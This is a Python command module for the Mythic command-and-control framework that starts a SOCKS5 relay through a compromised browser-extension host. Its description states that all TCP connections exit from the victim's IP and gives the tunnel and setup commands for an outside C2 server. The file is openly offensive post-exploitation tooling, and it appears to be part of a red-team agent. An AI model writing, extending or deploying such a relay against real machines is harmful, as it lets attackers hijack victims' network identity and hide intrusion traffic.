from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class IpProxyStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="WSS URL of socks_bridge.py (e.g. wss://c2server.com/proxy-ws)",
            ),
            CommandParameter(
                name="socks_port",
                type=ParameterType.Number,
                description="SOCKS5 port on the C2 server the operator SSH-tunnels to (default: 1080)",
                default_value=1080,
            ),
            CommandParameter(
                name="psk",
                type=ParameterType.String,
                description="Pre-shared key printed by proxy_install.py at install time",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            self.load_args_from_json_string(self.command_line)


class IpProxyStartCommand(CommandBase):
    cmd            = "ip_proxy_start"
    needs_admin    = False
    help_cmd       = "ip_proxy_start url=wss://c2.example.com/proxy-ws [socks_port=1080] [psk=<key>]"
    description    = (
        "Start the SOCKS5 IP proxy relay via proxy_host.py (native messaging).\n\n"
        "All TCP connections exit from the VICTIM's IP. The operator SSH-tunnels "
        "to socks_port on the C2 server.\n\n"
        "url        — WSS URL of socks_bridge.py running on the C2 server\n"
        "socks_port — SOCKS5 port on C2 the operator connects to (default 1080)\n"
        "psk        — Pre-shared key printed by proxy_install.py at install time\n\n"
        "Example:\n"
        "  ip_proxy_start url=wss://c2.example.com/proxy-ws socks_port=1080 psk=<key>\n\n"
        "SSH tunnel: ssh -L 1080:127.0.0.1:1080 user@c2.example.com\n"
        "Then configure browser/proxychains to use SOCKS5 127.0.0.1:1080\n\n"
        "Prerequisites: proxy_host.py registered on victim (see §16 in SETUP.md)\n"
        "  python3 native_host/proxy_install.py --extension-id <ID>"
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = IpProxyStartArguments
    attackmapping  = ["T1090.001", "T1185"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        url   = task.args.get_arg("url") or ""
        port  = task.args.get_arg("socks_port") or 1080
        psk   = task.args.get_arg("psk") or ""
        task.display_params = f"url={url} socks_port={port}" + (" psk=****" if psk else "")
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
